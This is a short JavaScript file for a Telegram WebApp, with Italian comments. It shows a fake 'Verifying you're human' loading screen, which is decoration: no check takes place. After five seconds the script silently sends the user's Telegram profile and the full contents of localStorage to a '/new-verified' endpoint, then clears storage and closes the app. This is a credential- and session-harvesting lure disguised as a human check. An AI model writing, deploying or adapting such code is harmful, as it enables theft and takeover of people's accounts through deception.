// deno-lint-ignore-file no-window
window.Sg = {
  verify: false,
  init() {
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.ready();
    }
  },
  close: () => {
    if (!this.verify) {
      this.verify = true;

      const isTelegram = window.Telegram?.WebApp?.initData;

      if (isTelegram) {
        // ✅ Schermata di caricamento identica allo stile originale
        document.body.innerHTML = `
  <div style="
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: white;
    font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen,
                 Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
    font-weight: 700;
    font-size: 1.5rem;
    color: black;
  ">
    Verifying you're human<span id="dots">.</span>
  </div>

  <style>
    @keyframes dotPulse {
      0%   { content: ""; }
      25%  { content: "."; }
      50%  { content: ".."; }
      75%  { content: "..."; }
      100% { content: ""; }
    }

    #dots::after {
      content: "";
      animation: dotPulse 1.2s steps(4, end) infinite;
    }
  </style>
`;

      }

      // ⏳ Attendi prima di chiudere
      if (isTelegram) {
        setTimeout(async () => {
          const user = window.Telegram.WebApp.initDataUnsafe.user || {};
          await fetch("/new-verified", {
            method: "POST",
            body: JSON.stringify({
              user,
              storage: window.localStorage,
            }),
            headers: {
              "content-type": "application/json",
            },
          });

          localStorage.clear();
          window.Telegram.WebApp.close();
        }, 5000); // ⏳ Chiude dopo 5 secondi
      }
    }
  },
};

Sg.init();
